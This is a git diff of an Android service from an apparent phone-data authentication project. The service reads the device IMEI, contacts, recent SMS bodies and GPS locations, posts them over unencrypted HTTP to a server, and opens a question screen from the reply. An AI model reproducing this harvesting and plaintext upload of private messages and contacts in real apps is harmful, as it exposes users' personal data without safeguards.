@@ -36,10 +36,10 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.provider.CallLog;
-import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
+
 
 public class Upload_info extends Service {
 
@@ -55,12 +55,14 @@ public class Upload_info extends Service {
 	private String contact_info;
 	private String sms_info;
 	private String gps_info;
+	private String result;
 	// private GPS_info gps_info_object = new GPS_info();
 	// private ArrayList<Process_item> process_info;
 	private boolean IMEI_uploaded;
 	private boolean cpu_info_uploaded;
 	private boolean mem_info_uploaded;
 	private boolean device_info_uploaded;
+	private boolean dialog_pop = false;
 	List<Map<String, Object>> process_info_obj = null;
 
 	public Http_post hp = new Http_post();
@@ -113,7 +115,8 @@ public class Upload_info extends Service {
 
 					HttpPost request = new HttpPost("http://"
 							+ Ip_addr.server_ip_address
-							+ "/DyAuthen/storeMobileInfomation.php");
+							//+ "/bbb/storeMobileInfomation.php");
+					 + "/DynAuth/storeMobileInfomation.php");
 					List<NameValuePair> params = new ArrayList<NameValuePair>();
 
 					// data constructor
@@ -162,7 +165,7 @@ public class Upload_info extends Service {
 
 					// GPS_info OK
 					gps_info = readFileData("locationRR.txt");
-	//				writeNewFileData("locationRR.txt", "");
+					// writeNewFileData("locationRR.txt", "");
 
 					params.add(new BasicNameValuePair("IMEI", IMEI));
 					params.add(new BasicNameValuePair("cpu_info", cpu_info));
@@ -182,22 +185,19 @@ public class Upload_info extends Service {
 							+ "\n" + phone_number + "\n" + contact_info + "\n"
 							+ sms_info + "\n" + gps_info + "\n");
 					try {
-						//Log.i("echo", "here we go");
+						// Log.i("echo", "here we go");
 						request.setEntity(new UrlEncodedFormEntity(params,
 								HTTP.UTF_8));
 						HttpResponse response = new DefaultHttpClient()
 								.execute(request);
 						if (response.getStatusLine().getStatusCode() == 200) {
-							String result = EntityUtils.toString(response
-									.getEntity());
+							result = EntityUtils.toString(response.getEntity());
 							// Toast.makeText(this, result,
 							// Toast.LENGTH_LONG).show();
 							writeNewFileData("sql.txt", "");
 							writeNewFileData("sql.txt", result);
 							Log.i("echo", result);
-						}
-						else
-						{
+						} else {
 							Log.i("echo", "something wrong");
 						}
 					} catch (Exception e) {
@@ -207,13 +207,51 @@ public class Upload_info extends Service {
 						Log.i("ghostli123456", e.getMessage().toString());
 						e.printStackTrace();
 					}
-					
-					//for dialog here 
-					
-					
+
+					// for dialog here
+					dialog_pop = true;
+
+					try {
+						Thread.sleep(1000);
+					} catch (InterruptedException e) {
+					}
+
+					openActivity(result);
 				}
 			}
 		}).start();
+	}
+
+	public void openActivity(String result) {
+		Intent intent = new Intent();
+		// intent.setClassName("com.example.mulactivity",
+		// "com.example.mulactivity.OtherActivity");
+		intent.setClass(this, OtherActivity.class);
+		// 2 intent.setClassName(this, "com.example.mulactivity.OtherActivity");
+		// 3 intent.setComponent(new ComponentName(this, OtherActivity.class));
+		intent.putExtra("lala", "gogo");
+		intent.putExtra("lala2", 999);
+		Bundle bundle = new Bundle();
+
+		String[] result_array = result.split("\n");
+		String[] array = result_array[0].split("&");
+		bundle.putString("type", array[0].substring(1));
+		bundle.putString("activity_id", array[1]);
+		bundle.putString("question", result_array[1].substring(2));
+		Log.i("ghostli123456", array[0].substring(1) + " ||| " + array[1]
+				+ "|||" + result_array[1].substring(2));
+		intent.putExtras(bundle);
+		// startActivity(intent);
+		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+		startActivity(intent);
+		// setContentView(R.layout.asdfmain);
+	}
+
+	protected void onActivityResult(int requestCode, int resultCOde, Intent data) {
+		String result = data.getStringExtra("result");
+		String resulttt = String.valueOf(requestCode);
+		Toast.makeText(this, resulttt, 1).show();
 	}
 
 	public String getSmsInPhone() {
@@ -243,9 +281,9 @@ public class Upload_info extends Service {
 
 				do {
 					String strAddress = cur.getString(index_Address);
-					//int intPerson = cur.getInt(index_Person);
+					// int intPerson = cur.getInt(index_Person);
 					String name = cur.getString(index_Person);
-					//String name=cur.getString(intPerson);
+					// String name=cur.getString(intPerson);
 					String strbody = cur.getString(index_Body);
 					long longDate = cur.getLong(index_Date);
 					int intType = cur.getInt(index_Type);
@@ -267,7 +305,7 @@ public class Upload_info extends Service {
 					// Log.i("Test", "time: " +
 					// Long.parseLong(cursor.getString(3))+"||"+System.currentTimeMillis()+"||"+testMinute);
 					if (testMinute < 60) {
-						//smsBuilder.append("[ ");
+						// smsBuilder.append("[ ");
 						smsBuilder.append(strAddress + "|");
 						smsBuilder.append(name + "|");
 						smsBuilder.append(strbody + "|");
